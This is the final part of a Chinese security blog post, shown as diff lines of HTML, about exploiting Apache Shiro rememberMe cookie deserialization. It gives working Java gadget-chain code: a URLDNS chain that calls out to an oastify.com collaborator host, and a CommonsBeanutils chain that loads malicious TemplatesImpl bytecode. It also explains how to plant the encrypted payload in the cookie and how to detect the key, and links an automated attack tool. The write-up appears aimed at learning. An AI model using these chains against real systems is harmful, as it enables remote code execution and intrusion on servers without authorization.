+<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span></span><span class="token class-name">Field</span></span><span class="token punctuation">;</span>
+<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>net<span class="token punctuation">.</span></span><span class="token operator">*</span></span><span class="token punctuation">;</span>
+<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">HashMap</span></span><span class="token punctuation">;</span>
+
+<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Main</span> <span class="token punctuation">&#123;</span>
+    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">IOException</span><span class="token punctuation">,</span> <span class="token class-name">ClassNotFoundException</span><span class="token punctuation">,</span> <span class="token class-name">NoSuchFieldException</span><span class="token punctuation">,</span> <span class="token class-name">IllegalAccessException</span> <span class="token punctuation">&#123;</span>
+        <span class="token class-name">HashMap</span> ht<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token class-name">String</span> url <span class="token operator">=</span> <span class="token string">"http://xtu23zlvbrt60860mj4zrotjpav1jv7k.oastify.com"</span><span class="token punctuation">;</span>
+        <span class="token class-name">URLStreamHandler</span> handler <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">TestURLStreamHandler</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token class-name">URL</span> u <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">URL</span><span class="token punctuation">(</span><span class="token keyword">null</span><span class="token punctuation">,</span>url<span class="token punctuation">,</span>handler<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        ht<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>u<span class="token punctuation">,</span>url<span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+        <span class="token class-name">Class</span> clazz <span class="token operator">=</span> <span class="token class-name">Class</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"java.net.URL"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token class-name">Field</span> field <span class="token operator">=</span> clazz<span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">"hashCode"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        field<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        field<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>u<span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+        <span class="token class-name">Serialize</span><span class="token punctuation">(</span>ht<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+
+    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token class-name">Serialize</span><span class="token punctuation">(</span><span class="token class-name">Object</span> obj<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">IOException</span> <span class="token punctuation">&#123;</span>
+        <span class="token class-name">ObjectOutputStream</span> oos<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">ObjectOutputStream</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">FileOutputStream</span><span class="token punctuation">(</span><span class="token string">"ser.bin"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        oos<span class="token punctuation">.</span><span class="token function">writeObject</span><span class="token punctuation">(</span>obj<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token class-name">Object</span> <span class="token class-name">Unserialize</span><span class="token punctuation">(</span><span class="token class-name">String</span> <span class="token class-name">Filename</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">IOException</span><span class="token punctuation">,</span> <span class="token class-name">ClassNotFoundException</span><span class="token punctuation">&#123;</span>
+        <span class="token class-name">ObjectInputStream</span> ois <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectInputStream</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">FileInputStream</span><span class="token punctuation">(</span><span class="token class-name">Filename</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token class-name">Object</span> obj <span class="token operator">=</span> ois<span class="token punctuation">.</span><span class="token function">readObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token keyword">return</span> obj<span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span>
+<span class="token keyword">class</span> <span class="token class-name">TestURLStreamHandler</span> <span class="token keyword">extends</span> <span class="token class-name">URLStreamHandler</span> <span class="token punctuation">&#123;</span>
+    <span class="token annotation punctuation">@Override</span>
+    <span class="token keyword">protected</span> <span class="token class-name">URLConnection</span> <span class="token function">openConnection</span><span class="token punctuation">(</span><span class="token class-name">URL</span> u<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">IOException</span> <span class="token punctuation">&#123;</span>
+        <span class="token keyword">return</span> <span class="token keyword">null</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+    <span class="token annotation punctuation">@Override</span>
+    <span class="token keyword">protected</span> <span class="token keyword">synchronized</span> <span class="token class-name">InetAddress</span> <span class="token function">getHostAddress</span><span class="token punctuation">(</span><span class="token class-name">URL</span> u<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+        <span class="token keyword">return</span> <span class="token keyword">null</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>将 AES 加密出来的编码替换包中的 RememberMe Cookie，将 JSESSIONID 删掉，因为当存在 JSESSIONID 时，会忽略 rememberMe</p>
+<p><img src="/blog/2024/07/15/Shiro-Attack/image-20240920175037446.png" alt="image-20240920175037446"></p>
+<p><img src="/blog/2024/07/15/Shiro-Attack/image-20240920175107466.png" alt="image-20240920175107466"></p>
+<hr>
+<h3 id="CB链"><a href="#CB链" class="headerlink" title="CB链"></a>CB链</h3><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>example<span class="token punctuation">.</span>cb</span><span class="token punctuation">;</span>
+
+<span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>example<span class="token punctuation">.</span></span><span class="token class-name">Utils</span></span><span class="token punctuation">;</span>
+<span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xalan<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>xsltc<span class="token punctuation">.</span>trax<span class="token punctuation">.</span></span><span class="token class-name">TemplatesImpl</span></span><span class="token punctuation">;</span>
+<span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xalan<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>xsltc<span class="token punctuation">.</span>trax<span class="token punctuation">.</span></span><span class="token class-name">TransformerFactoryImpl</span></span><span class="token punctuation">;</span>
+<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>beanutils<span class="token punctuation">.</span></span><span class="token class-name">BeanComparator</span></span><span class="token punctuation">;</span>
+
+<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">PriorityQueue</span></span><span class="token punctuation">;</span>
+
+<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Main</span> <span class="token punctuation">&#123;</span>
+    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span><span class="token punctuation">&#123;</span>
+
+        <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> code <span class="token operator">=</span> <span class="token class-name">Utils<span class="token punctuation">.</span>GenerateEvil</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token class-name">TemplatesImpl</span> obj <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">TemplatesImpl</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token class-name">Utils<span class="token punctuation">.</span>SetValue</span><span class="token punctuation">(</span>obj<span class="token punctuation">,</span> <span class="token string">"_name"</span><span class="token punctuation">,</span><span class="token string">"0w0"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token class-name">Utils<span class="token punctuation">.</span>SetValue</span><span class="token punctuation">(</span>obj<span class="token punctuation">,</span> <span class="token string">"_bytecodes"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span>code<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token class-name">Utils<span class="token punctuation">.</span>SetValue</span><span class="token punctuation">(</span>obj<span class="token punctuation">,</span> <span class="token string">"_tfactory"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">TransformerFactoryImpl</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+        <span class="token keyword">final</span> <span class="token class-name">BeanComparator</span> beanComparator <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">BeanComparator</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token keyword">final</span> <span class="token class-name">PriorityQueue</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Object</span><span class="token punctuation">></span></span> queue <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">PriorityQueue</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Object</span><span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> beanComparator<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        queue<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        queue<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+        <span class="token class-name">Utils<span class="token punctuation">.</span>SetValue</span><span class="token punctuation">(</span>beanComparator<span class="token punctuation">,</span> <span class="token string">"property"</span><span class="token punctuation">,</span> <span class="token string">"outputProperties"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token class-name">Utils<span class="token punctuation">.</span>SetValue</span><span class="token punctuation">(</span>queue<span class="token punctuation">,</span> <span class="token string">"queue"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span>obj<span class="token punctuation">,</span> obj<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+<span class="token comment">//        String barr = Utils.Serialize(queue);</span>
+<span class="token comment">//        System.out.println(barr);</span>
+<span class="token comment">//        Utils.UnSerialize(barr);</span>
+        <span class="token class-name">Utils<span class="token punctuation">.</span>Serbin</span><span class="token punctuation">(</span>queue<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>打的过程中遇到了一点小问题，shiro 自带的 cb 版本是1.8.3，而我的 cb 版本是1.9，报错弹不出计算器</p>
+<pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">Caused by: java.io.InvalidClassException: org.apache.commons.beanutils.BeanComparator; local class incompatible: stream classdesc serialVersionUID = -2044202215314119608, local class serialVersionUID = -3490850999041592962<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<blockquote>
+<p>如果两个不同版本的库使用了同一个类，而这两个类可能有一些方法和属性有了变化，此时在序列化通信的时候就可能因为不兼容导致出现隐患。因此，Java在反序列化的时候提供了一个机制，序列化时会根据固定算法计算出一个当前类的 <code>serialVersionUID</code> 值，写入数据流中；反序列化时，如果发现对方的环境中这个类计算出的 <code>serialVersionUID</code> 不同，则反序列化就会异常退出，避免后续的未知隐患</p>
+</blockquote>
+<p>怎么办？本地降级吧（</p>
+<p>y4佬的操作：<a target="_blank" rel="noopener" href="https://gv7.me/articles/2020/deserialization-of-serialvesionuid-conflicts-using-a-custom-classloader/">https://gv7.me/articles/2020/deserialization-of-serialvesionuid-conflicts-using-a-custom-classloader/</a></p>
+<p><img src="/blog/2024/07/15/Shiro-Attack/image-20240920180306191.png" alt="image-20240920180306191"></p>
+<hr>
+<h3 id="CC11链"><a href="#CC11链" class="headerlink" title="CC11链"></a>CC11链</h3><p>还没学</p>
+<hr>
+<h2 id="漏洞探测"><a href="#漏洞探测" class="headerlink" title="漏洞探测"></a>漏洞探测</h2><p>致敬传奇一把梭工具：<a target="_blank" rel="noopener" href="https://github.com/SummerSec/ShiroAttack2">https://github.com/SummerSec/ShiroAttack2</a></p>
+<p>原理：<a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s?__biz=MzIzOTE1ODczMg==&mid=2247485052&idx=1&sn=b007a722e233b45982b7a57c3788d47d&scene=21">https://mp.weixin.qq.com/s?__biz=MzIzOTE1ODczMg==&amp;mid=2247485052&amp;idx=1&amp;sn=b007a722e233b45982b7a57c3788d47d&amp;scene=21</a></p>
+<p>当密钥不正确或类型转换异常时，目标 Response 包含 <code>Set-Cookie：rememberMe=deleteMe</code> 字段，而当密钥正确且没有类型转换异常时，返回包不存在 <code>Set-Cookie：rememberMe=deleteMe</code> 字段</p>
+<hr>
+<h1 id="Shiro721"><a href="#Shiro721" class="headerlink" title="Shiro721"></a>Shiro721</h1><p>请看我学shir0721吧（（（</p>
+<p>粗略看了一下貌似是密钥生成方式改变了，变成了动态生成，而且是CBC模式，和CBC攻击有关，<del>等我回头复习一下密码学</del></p>
+
+    </div>
+    
+    
+    
+    
+    
+    
+    
+</div>
+
+            </div>
+        </transition>
+        
+        <transition name="fade">
+            <div id="preview" ref="preview" v-show="previewShow">
+                <img id="preview-content" ref="previewContent" />
+            </div>
+        </transition>
+        
+    </div>
+    <script src="/blog/js/main.js"></script>
+    
+    
+
+
+
+
+    
+    
+
+<div id="vcomments"></div>
+
+<script src="/blog/js/lib/valine.min.js"></script>
+<script>
+    new Valine({
+        el: '#vcomments',
+        app_id: 'U9mZLKunkRUTcBFthjXPjnZE-9Nh9j0Va',
+        app_key: 'SzWOnY0PWLGNuL6jW8TZYc7j',
+        visitor: 'true',
+        placeholder: '写点什么吧(●ˇ∀ˇ●)',
+        serverURLs: 'https://u9mzlkun.lc-cn-n1-shared.com',
+    });
+</script>
+
+    <footer id="footer">
+    <div id="footer-wrap">
+        <div>
+            &copy;
+            2022 - 2025 雲流のLowest World
+            <span id="footer-icon">
+                <i class="fa-solid fa-font-awesome fa-fw"></i>
+            </span>
+            &commat;C1oudfL0w0
+        </div>
+        <div>
+            Based on the <a target="_blank" rel="noopener" href="https://hexo.io">Hexo Engine</a> &amp;
+            <a target="_blank" rel="noopener" href="https://github.com/argvchs/hexo-theme-particlex">ParticleX Theme</a>
+        </div>
+        
+    </div>
+</footer>
+
+<script src="/blog/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"model":{"jsonPath":"/blog/live2dw/assets/z16.model.json"},"display":{"position":"left","width":150,"height":290},"mobile":{"show":false},"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
+
+</html>
